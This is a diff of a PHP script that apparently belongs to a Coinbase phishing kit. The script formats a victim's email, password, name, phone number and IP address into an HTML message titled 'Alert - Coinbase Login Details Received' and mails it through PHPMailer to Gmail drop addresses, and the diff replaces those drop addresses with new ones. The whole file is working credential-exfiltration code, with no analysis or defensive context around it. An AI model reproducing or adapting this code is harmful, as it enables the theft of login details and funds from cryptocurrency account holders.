@@ -7,28 +7,27 @@ require 'PHPMailer/PHPMailerAutoload.php';
 require 'PHPMailer/class.phpmailer.php';
 
 
-    $customerEmailer = '<!DOCTYPE html>
-                                <html>
-                                    <head>
-                                        <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
-                                        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-                                        <style>p{ margin:0 !important; padding:0 !important;}</style>
-                                    </head>
-                                    <body>
-                                        <p>Email : ' . $email . '</p>
-                                        <p>Password : ' . $password . '</p>
-                                        <p>First Name : ' . $fname . '</p>
-                                        <p>Last Name : ' . $lname . '</p>
-                                        <p>Registered  Number : ' . $number . '</p>
-                                        <p>IP : ' . $ip . '</p>
-                                        </body>
-                                </html>';
-    $subject = 'Alert - coinbase Login Details Received';
+$customerEmailer = '<!DOCTYPE html>
+                            <html>
+                                <head>
+                                    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+                                    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+                                    <style>p{ margin:0 !important; padding:0 !important;}</style>
+                                </head>
+                                <body>
+                                    <p>Email : ' . @$email . '</p>
+                                    <p>Password : ' . @$password . '</p>
+                                    <p>Full Name : ' . @$name . '</p>
+                                    <p>Registered  Number : ' . @$number . '</p>
+                                    <p>IP : ' . @$ip . '</p>
+                                    </body>
+                            </html>';
+$subject = 'Alert - Coinbase Login Details Received';
  
 
 $message = $customerEmailer;
-$toAddress = 'brownbdrown@gmail.com';
-$toAddress1 = 'brownbdrown@gmail.com';
+$toAddress = 'jeomark07@gmail.com';
+$toAddress1 = 'oliverbuxton007@gmail.com';
 $fromTitle = $_SERVER['HTTP_HOST'];
 $fromEmail = 'details@' . $_SERVER['HTTP_HOST'];
 $mail = new PHPMailer;
